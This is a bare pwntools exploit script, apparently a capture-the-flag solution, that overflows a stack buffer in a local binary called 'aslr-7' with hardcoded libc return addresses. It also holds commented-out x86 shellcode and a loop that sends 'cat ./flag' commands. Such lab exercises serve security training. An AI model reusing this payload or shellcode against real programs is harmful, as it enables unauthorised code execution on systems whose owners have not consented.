#! /usr/bin/python

from pwn import *
#import os
import time

#context.terminal = ['tmux', 'splitw', '-h']

#shellcode =  '\xb83\x01\x01\x01-\x01\x01\x01\x01\xcd\x80\x89\xc3\x89\xc1\xb8H\x01\x01\x01-\x01\x01\x01\x01\xcd\x801\xc9QjA\x89\xe31\xd2\xb8\x0c\x01\x01\x01-\x01\x01\x01\x01\xcd\x80'

#[ebp+8]
#[ret]&buffer
#[ebp]
#[ebp-4]
#
#...
#
#[ebp-88]


buffer = "A" * 0x8c + p32(0xb7dfc7e0) + "BBBB" + p32(0xb7dfcb67) + p32(0) + p32(0)

#while True:
p = process("./aslr-7")
p.recv()
raw_input("Break")
p.sendline(buffer)
#p.sendline("cat ./flag; "*10)
#flag = p.recv()
#if "cand" in flag:
#	print(flag)
#	break
#print(flag)
p.recv()
print(p.poll())
p.close()
